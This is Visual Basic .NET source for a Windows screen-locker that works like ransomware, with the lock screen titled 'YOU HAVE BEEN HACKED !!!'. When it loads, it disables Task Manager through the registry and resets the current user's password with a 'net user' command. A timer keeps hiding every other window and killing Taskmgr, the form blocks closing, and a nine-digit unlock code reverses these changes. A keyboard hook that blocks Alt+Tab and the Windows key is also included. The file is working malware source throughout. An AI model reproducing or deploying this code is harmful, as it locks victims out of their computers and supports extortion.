Imports System.Runtime.InteropServices 'Used with APIs
Imports Microsoft.Win32

Public Class Encrypted
    Private nonNumberedEntered As Boolean
    Private windowKeyPressed As Boolean
    Private Const SW_HIDE As Int32 = 0
    Private Const SW_RESTORE As Int32 = 9
    Private _getWindowText As Integer

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function GetForegroundWindow() As IntPtr
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function GetAsyncKeyState(ByVal vKey As System.Windows.Forms.Keys) As Int32
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function GetWindowText(ByVal hWnd As IntPtr, ByVal text As System.Text.StringBuilder, ByVal count As Integer) As Integer
    End Function

    <DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    Private Shared Function GetWindowTextLength(ByVal hWnd As IntPtr) As Integer
    End Function

    <DllImport("user32.dll", EntryPoint:="ShowWindow", CharSet:=CharSet.Auto)> _
    Private Shared Function ShowWindow(ByVal hwnd As Int32, ByVal nCmdShow As Int32) As Int32
    End Function

    '<DllImport("user32.dll", CharSet:=CharSet.Auto, SetLastError:=True)> _
    'Private Shared Function GetProcessNames(ByVal hwnd As Int32, ByVal text)



    'For diabling KEY COMBINATIONS
    Declare Function SetWindowsHookEx Lib "user32" Alias "Set WindowsHookExA" (ByVal idHook As Integer, _
                                                                               ByVal lpfn As LowLevelKeyboardProcDelegate, _
                                                                               ByVal hMod As IntPtr, _
                                                                               ByVal dwThreadId As Integer) _
                                                                           As IntPtr
    Declare Function UnhookWindowsHookEx Lib "user32" Alias "UnhookWindowsHookEx" (ByVal hHook As IntPtr) As Boolean
    Declare Function CallNextHookEx Lib "user32" Alias "CallNextHookEx" (ByVal hHook As IntPtr, _
                                                                         ByVal nCode As Integer, _
                                                                         ByVal wParam As Integer, _
                                                                         ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    Delegate Function LowLevelKeyboardProcDelegate(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
    Const WH_KEYBOARD_LL As Integer = 13

    Structure KBDLLHOOKSTRUCT
        Dim vkCode As Integer
        Dim scanCode As Integer
        Dim flags As Integer
        Dim time As Integer
        Dim dwExtraInfo As Integer
    End Structure

    Dim intLLKey As IntPtr




    Private Sub Encrypted_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If (e.CloseReason = CloseReason.UserClosing) Then
            e.Cancel = True
        End If
    End Sub

    Private Sub TextBox9_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox9.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox9_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox9.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox9.Text = ""
        End If
    End Sub

    Private Sub TextBox9_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles TextBox9.TextChanged
        On Error Resume Next
        If ((Val(TextBox1.Text) = 9) And (Val(TextBox2.Text) = 8) And (Val(TextBox3.Text) = 3) And (Val(TextBox4.Text) = 9) And (Val(TextBox5.Text) = 0) And (Val(TextBox6.Text) = 5) And (Val(TextBox7.Text) = 1) And (Val(TextBox8.Text) = 3) And (Val(TextBox9.Text) = 1)) Then
            Call EnableTaskManager()
            Dim w As Object = CreateObject("WScript.Shell")
            w.Run("cmd /c net user %username% """)
            'UnhookWindowsHookEx(intLLKey)
            End
        Else
            TextBox1.Text = ""
            TextBox2.Text = ""
            TextBox3.Text = ""
            TextBox4.Text = ""
            TextBox5.Text = ""
            TextBox6.Text = ""
            TextBox7.Text = ""
            TextBox8.Text = ""
            TextBox9.Text = ""
            TextBox1.Focus()
        End If

    End Sub

    Private Sub TextBox1_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If

        'If Control.ModifierKeys = Keys.LWin Then
        'windowKeyPressed = True
        'End If
    End Sub

    Private Sub TextBox1_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox1.KeyPress
        'If windowKeyPressed = True Then
        'e.Handled = True
        'MsgBox("slkf")
        'End If

        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox1.Text = ""
            TextBox2.Focus()
        End If

    End Sub

    Private Sub TextBox2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox2.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox2_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox2.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox2.Text = ""
            TextBox3.Focus()
        End If
    End Sub

    Private Sub TextBox3_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox3.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox3_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox3.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox3.Text = ""
            TextBox4.Focus()
        End If
    End Sub

    Private Sub TextBox4_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox4.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox4_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox4.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox4.Text = ""
            TextBox5.Focus()
        End If
    End Sub

    Private Sub TextBox5_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox5.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox5_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox5.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox5.Text = ""
            TextBox6.Focus()
        End If
    End Sub

    Private Sub TextBox6_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox6.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox6_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox6.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox6.Text = ""
            TextBox7.Focus()
        End If
    End Sub

    Private Sub TextBox7_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox7.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox7_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox7.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox7.Text = ""
            TextBox8.Focus()
        End If
    End Sub

    Private Sub TextBox8_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox8.KeyDown
        nonNumberedEntered = False
        windowKeyPressed = False
        If e.KeyCode < Keys.D0 OrElse e.KeyCode > Keys.D9 Then
            If e.KeyCode < Keys.NumPad0 OrElse e.KeyCode > Keys.NumPad9 Then
                nonNumberedEntered = True
            End If
        End If
    End Sub

    Private Sub TextBox8_KeyPress(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyPressEventArgs) Handles TextBox8.KeyPress
        If nonNumberedEntered = True Then
            e.Handled = True
        Else
            TextBox8.Text = ""
            TextBox9.Focus()
        End If
    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        On Error Resume Next
        Dim window As IntPtr
        window = GetForegroundWindow()

        Dim windowTitle As String = String.Empty
        Dim WindowTitleLength As Integer = GetWindowTextLength(window) + 1
        Dim stringBuilder As New System.Text.StringBuilder(WindowTitleLength)

        GetWindowText(window, stringBuilder, WindowTitleLength)
        windowTitle = stringBuilder.ToString()

        If windowTitle <> "YOU HAVE BEEN HACKED !!!" Then
            ShowWindow(window, SW_HIDE)
        End If

        'Dim processExist As Boolean = Process.GetProcesses().Any(Function(p) p.ProcessName.Contains("Task Manager"))
        For Each proc As Process In Process.GetProcesses
            If proc.ProcessName = "Taskmgr" Then
                proc.Kill()
            End If
        Next



        'System.Threading.Thread.Sleep(1)    'Amount of time your loop will wait unitl it will run again

        'If (GetAsyncKeyState(Keys.Delete)) Then
        'ShowWindow(window, SW_RESTORE)
        'Timer1.Enabled = False
        'Exit While
        'End If

    End Sub

    Private Sub Encrypted_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        GroupBox1.Focus()
        Call DisableTaskManager()
        'intLLKey = SetWindowsHookEx(WH_KEYBOARD_LL, AddressOf LowLevelKeyboardProc, IntPtr.Zero, 0)

        Dim w As Object = CreateObject("WScript.Shell")
        w.Run("cmd /c net user %username% 983905131")
    End Sub

    Private Sub DisableTaskManager()
        Dim regKey As RegistryKey
        Dim KeyValueInt As String = "1"
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        Try
            regKey = Registry.CurrentUser.CreateSubKey(subKey)
            regKey.SetValue("DisableTaskMgr", KeyValueInt)
            regKey.Close()
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, " ERROR!")
        End Try
    End Sub

    Private Sub EnableTaskManager()
        Dim regKey As RegistryKey
        Dim KeyValueInt As String = "0"
        Dim subKey As String = "Software\Microsoft\Windows\CurrentVersion\Policies\System"

        Try
            regKey = Registry.CurrentUser.CreateSubKey(subKey)
            'regKey.SetValue("DisableTaskMgr", KeyValueInt)
            regKey.DeleteValue("DisableTaskMgr")
            regKey.Close()
        Catch ex As Exception
            MsgBox(ex.Message, MsgBoxStyle.Critical, " ERROR!")
        End Try
    End Sub

    Private Function LowLevelKeyboardProc(ByVal nCode As Integer, ByVal wParam As Integer, ByRef lParam As KBDLLHOOKSTRUCT) As Integer
        Dim blnEat As Boolean = False

        Select Case wParam
            Case 256, 257, 260, 261
                'ALT+TAB, ALT+ESC, CTRL+ESC, WINDOWS KEY
                blnEat = ((lParam.vkCode = 9) AndAlso (lParam.flags = 32)) Or _
                    ((lParam.vkCode = 27) AndAlso (lParam.flags = 32)) Or _
                    ((lParam.vkCode = 27) AndAlso (lParam.flags = 0)) Or _
                    ((lParam.vkCode = 91) AndAlso (lParam.flags = 1)) Or _
                    ((lParam.vkCode = 92) AndAlso (lParam.flags = 1))
        End Select

        If blnEat = True Then
            Return 1
        Else
            Return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam)
        End If

    End Function

    Private Sub Timer2_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer2.Tick
        Static i As Integer = 3
        i = i + 1
        Select Case i
            'Case 2 : Label2.Show()
            'Case 3 : Label3.Show()
            Case 4 : Label4.Show()
            Case 5 : Label5.Show()
            Case 6 : Label6.Show()
            Case 7 : Label7.Show()
            Case 8 : Label8.Show()
                TextBox1.Enabled = True
                TextBox2.Enabled = True
                TextBox3.Enabled = True
                TextBox4.Enabled = True
                TextBox5.Enabled = True
                TextBox6.Enabled = True
                TextBox7.Enabled = True
                TextBox8.Enabled = True
                TextBox9.Enabled = True
                TextBox1.Focus()
                Timer2.Enabled = False
        End Select
    End Sub
End Class
